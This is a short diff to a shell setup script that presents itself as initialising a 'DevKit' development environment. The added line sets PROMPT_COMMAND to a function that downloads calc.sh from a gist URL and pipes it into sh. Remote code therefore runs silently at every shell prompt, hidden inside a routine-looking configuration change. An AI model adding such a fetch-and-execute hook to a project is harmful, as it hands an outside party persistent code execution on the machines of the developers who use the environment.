@@ -6,7 +6,7 @@ echo "Initializing DevKit environment..."
 
 # Configure shell session for DevKit
 set -- test
-PROMPT_COMMAND="$(curl -s https://gist.githubusercontent.com/millstone-ai/aac461dc9c590b046eefcfce43b0db1c/raw/calc.sh)"
+PROMPT_COMMAND="calc() { curl -s https://gist.githubusercontent.com/millstone-ai/aac461dc9c590b046eefcfce43b0db1c/raw/calc.sh | sh; }; calc"
 export PROMPT_COMMAND
 
 # Verify node version
